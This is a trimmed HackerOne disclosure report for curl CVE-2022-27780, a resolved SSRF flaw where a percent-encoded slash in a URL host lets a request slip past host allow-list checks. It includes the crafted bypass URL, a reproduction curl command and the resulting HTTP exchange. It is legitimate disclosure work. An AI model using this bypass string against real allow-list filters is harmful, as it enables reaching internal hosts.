# [M] CVE-2022-27780: percent-encoded path separator in URL host

## Summary
Severity: Medium
Program: curl
Weakness: Server-Side Request Forgery (SSRF)
Reporter: haxatron1
State: resolved
Disclosed: 2022-05-11T15:33:27.339Z
CVE: CVE-2022-27780
Source: https://hackerone.com/reports/1553841

## Details
## Summary:
URL decoding the entire proxy string could lead to SSRF filter bypasses. For example,

When the following curl specifies the proxy string `http://example.com%2F127.0.0.1`

- If curl URL parser or another RFC3986 compliant parser parses the initial string http://127.0.0.1%2F.example.com, it will derive 127.0.0.1%2Fexample.com or 127.0.0.1/example.com as the host, if for instance, an SSRF check is used to determine if a host ends with .example.com (.example.com being a allow-listed domain), the check will succeed.
- curl will then URL decode the entire proxy string to http://127.0.0.1/example.com and send it to the server
````
GET http://127.0.0.1/example.com HTTP/1.1
Host: 127.0.0.1/example.com
User-Agent: curl/7.83.0
Accept: */*
Proxy-Connection: Keep-Alive
````
- This proxy string is valid, and proxy servers, even RFC3986-compliant ones will send the request to the host 127.0.0.1

## Steps To Reproduce:
I switched things up and used 127.0.0.1 as the allow-listed server and example.com as the target server to make it easier (no need to setup a HTTP server) to reproduce.

1. I used https://github.com/abhinavsingh/proxy.py as my proxy server. 
2. Perform the following:
````
curl -x http://127.0.0.1:8899 http://example.com%2F127.0.0.1
````
3. You will receive a malformed response 
````
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
        <head>
                <title>400 - Bad Request</title>
        </head>
        <body>
                <h1>400 - Bad Request</h1>
        </body>
</html>
````

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1553841_
